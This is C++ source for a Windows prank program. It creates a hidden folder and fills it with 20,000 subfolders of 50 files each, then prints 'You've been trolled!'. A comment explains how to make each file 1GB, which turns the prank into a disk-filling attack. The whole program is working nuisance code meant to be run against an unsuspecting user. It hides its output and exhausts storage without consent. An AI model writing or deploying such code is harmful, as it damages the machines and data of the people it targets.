#include <iostream>
#include <filesystem>
#include <fstream>
#include <windows.h>
#include <chrono>
#include <thread>

using namespace std;

int wait(int timeToWait) {
    // Wait for x seconds
    this_thread::sleep_for(chrono::seconds(timeToWait));

    return 0;
}


// Function to create the main folder and set it to hidden
void create_mainfolder(const filesystem::path& base_path) {
    if (filesystem::exists(base_path)) {
        cout << "\n'BeansFolders' folder already exists\n";
    }
    else {
        cout << "\nCreating folder...\n";
        filesystem::create_directories(base_path);
        // Set the folder attribute to hidden
        SetFileAttributes(base_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
        if (GetLastError() == ERROR_SUCCESS) {
            cout << "'BeansFolders' folder created and hidden\n";
        }
        else {
            cout << "\nFailed to hide 'BeansFolders' folder. Error code: " << GetLastError() << "\n";
        }
    }
}

// Function to create secondary folders
void create_files(const filesystem::path& base_path) {
    for (int folder_num = 1; folder_num <= 20000; ++folder_num) {
        filesystem::path folder_path = base_path / ("Beans_" + to_string(folder_num));
        filesystem::create_directories(folder_path);
        cout << "\nFolders created:\n [" << folder_num << "/20000]\n\n";
        // Create files in the folder
        for (int file_num = 1; file_num <= 50; ++file_num) {
            filesystem::path file_path = folder_path / ("Beans_" + to_string(file_num) + ".txt");
            ofstream file(file_path);
            
            
            file << string(1, 'e'); //100000000 for 1GB files, 10000000 for 10MB files, 1 for 1KB files LOL
             
            file.close();
            if (file_num < 10) {
                cout << "File: " << " [0" << file_num << "/50]\n";
            }
            else {
                cout << "File: " << " [" << file_num << "/50]\n";
            }
        }
        //wait(1);
    }
}

int main() {
    filesystem::path base_path = "BeansFolders";
    create_mainfolder(base_path);
    create_files(base_path);
    cout << "You've been trolled!\n";
    return 0;
}
